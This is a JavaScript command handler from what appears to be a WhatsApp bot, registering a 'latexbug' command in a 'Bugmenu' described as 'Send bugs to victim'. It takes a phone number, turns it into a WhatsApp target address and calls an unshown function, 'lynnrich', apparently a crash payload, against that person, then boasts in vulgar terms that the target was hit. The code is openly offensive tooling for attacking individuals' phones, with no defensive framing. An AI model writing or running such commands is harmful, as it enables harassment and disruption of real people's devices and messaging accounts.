keith({
  pattern: "latexbug",
  aliases: ["buglatex", "latexbg"],
  category: "Bugmenu",
  description: "Send bugs to victim",
  filename: __filename
}, async (from, client, conText) => {
  const { reply, q, isSuperUser } = conText;

  if (!isSuperUser) {
    return reply("Owner only!");
  }

  const number = q?.trim().replace(/\D/g, "");

  if (!number) {
    return reply("provide number");
  }

  const target = number + "@s.whatsapp.net";

  try {
   

    const result = await lynnrich(client, target);

    return reply(
      `Target fucked successfully 💀`
    );
  } catch (err) {
    console.error("richbg error:", err);
    return reply(`❌ Error: ${err.message}`);
  }
});
